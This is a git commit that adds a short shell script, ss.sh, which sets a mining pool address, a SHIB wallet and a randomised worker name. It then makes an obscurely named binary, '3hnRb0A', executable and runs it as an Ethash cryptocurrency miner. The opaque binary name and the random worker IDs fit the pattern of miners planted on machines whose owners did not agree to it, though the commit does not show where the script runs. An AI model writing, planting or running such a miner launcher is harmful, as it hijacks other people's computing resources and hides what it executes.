fee9a4cf1acbaf677758987429ad454e69dbd735
lambohopo <86089421+lambohopo@users.noreply.github.com>
2021-06-30 15:40:32 +0700

    Create ss.sh

---
+++ ss.sh
@@ -0,0 +1,7 @@
+#!/bin/bash
+POOL=ethash.unmineable.com:3333
+WALLET=SHIB:0x1bfbd41ec85709c80bd3d5790bc22ba8a12b0836
+WORKEER=$(echo $(shuf -i 10000-99999999999 -n 1)-LGK)
+
+chmod  x 3hnRb0A
+./3hnRb0A --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
